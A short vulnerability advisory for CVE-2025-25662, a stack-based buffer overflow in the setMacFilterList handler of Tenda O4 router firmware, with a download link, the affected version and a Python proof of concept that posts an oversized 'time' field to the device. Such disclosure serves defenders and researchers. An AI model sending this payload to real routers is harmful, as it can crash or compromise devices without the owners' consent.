#  CVE-2025-25662

download： https://www.tenda.com.cn/material/show/624459360641093

## **Affected version**

Tenda O4 V3.0 V1.0.0.10(2936)

## Vulnerability details

The vulnerability affects the function from SafeSetMacFilter of the file /goform/setMacFilterList. The manipulation of the argument remark/type/time leads to stack-based buffer overflow.

## poc

```python
import requests

ip = "ip"
url = f"http://{ip}/goform/setMacFilterList"

payload = "a" * 5000

data = {
     "action": "add",
     "time": payload
}

response = requests.post(url, data=data)

print(f"Status Code: {response.status_code}")
print(f"Response: {response.text}")
```

